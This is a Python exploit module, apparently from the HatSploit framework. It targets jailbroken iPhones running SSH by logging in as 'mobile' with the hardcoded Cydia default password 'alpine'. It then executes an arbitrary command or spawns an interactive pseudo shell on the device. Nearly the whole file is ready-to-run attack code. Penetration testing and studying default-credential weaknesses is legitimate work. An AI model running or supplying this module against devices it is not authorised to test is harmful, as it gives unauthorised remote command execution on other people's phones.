#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import paramiko
from utils.shell.pseudo_shell import pseudo_shell

from core.lib.module import Module


class HatSploitModule(Module):
    pseudo_shell = pseudo_shell()
    client = None

    details = {
        'Name': "iPhoneOS SSH Cydia.app Default Password",
        'Module': "exploit/iphoneos/ssh/cydia_default_password",
        'Authors': [
            'enty8080'
        ],
        'Description': "Bypass iPhoneOS SSH authorization using Cydia.app default SSH password.",
        'Dependencies': [
            'paramiko'
        ],
        'Comments': [
            ''
        ],
        'Platform': "iphoneos",
        'Risk': "medium"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 22,
            'Type': "port",
            'Required': True
        },
        'USERNAME': {
            'Description': "Shell username.",
            'Value': "mobile",
            'Type': None,
            'Required': True
        },
        'COMMAND': {
            'Description': "Command to execute.",
            'Value': "whoami",
            'Type': None,
            'Required': True
        },
        'PSEUDO': {
            'Description': "Spawn Pseudo shell.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def execute_command(self, command):
        self.output_process("Attempting to execute command...")
        response = self.client.exec_command(command)[1]
        response = response.readlines()

        if response:
            self.output_information("Command output:")
            for output in response:
                self.output_empty(output.strip())
        else:
            self.output_warning("No output provided by command.")

    def run(self):
        remote_host, remote_port, username, command, pseudo = self.parse_options(self.options)
        target = remote_host + ":" + remote_port

        self.output_process("Exploiting " + target + "...")

        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.client.connect(remote_host, port=remote_port, username=username, password='alpine')
        except Exception:
            self.output_error("Exploit failed!")
            return

        self.output_process("Logging as " + username + "...")
        self.output_success("Successfully logged as " + username + "!")

        if pseudo.lower() in ['yes', 'y']:
            self.pseudo_shell.spawn_pseudo_shell(self.details['Module'], self.execute_command)
        else:
            self.execute_command(command)
        self.client.close()
